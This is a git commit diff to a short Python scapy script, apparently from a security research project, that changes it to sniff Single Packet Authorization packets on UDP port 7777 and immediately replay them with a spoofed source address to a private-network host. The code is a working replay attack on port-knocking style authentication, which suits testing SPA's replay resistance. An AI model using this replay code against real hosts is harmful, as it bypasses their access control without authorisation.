974dac04f859e015d69d003a45f4dbdfc7f3752c
guitoun3 <guillaume.desbieys@gmail.com>
2015-03-17 10:31:27 +0100

    Catch and replay SPA

--- oscar/replay.py
+++ oscar/replay.py
@@ -6,7 +6,7 @@ import sys
 
 packetCount = 0
 
-def customAction(packet):
+def catchAndReplay(packet):
     global packetCount
     packetCount += 1
 
@@ -16,14 +16,15 @@ def customAction(packet):
 
     packet.show()
 
-    print "RAW = %s " % (rawLoad)
+    print "Now replaying..."
+
+    send(IP(dst="192.168.2.1",src="192.168.0.1")/UDP(dport=7777)/rawLoad)
 
     sys.exit(1)
 
 
-sniff(filter="udp and port 7777",prn=customAction)
+sniff(filter="udp and port 7777",prn=catchAndReplay)
 
-raw = "\x12e\xaf'~\xff_9\xf4\x9dn\x89R\xbd/v~u\nZ2!\xe7u\x1a\x004\xb6<\xfaqf3\t\xb2\x91\xa6/\xc0?m\xd0V\x1a\x06\xff\xb7\xc3\xfb\x167\xad\xadIM?\x180\xb1\x97)\xf3\x1a!"
 
 """
 raw correspond to
@@ -36,4 +37,3 @@ protocol : 0 (TCP)
 md5sum : f71dbe52628a3f83a77ab494817525c6
 """
 
-send(IP(dst="127.0.0.1",src="111.111.111.111")/UDP(dport=7777)/raw)
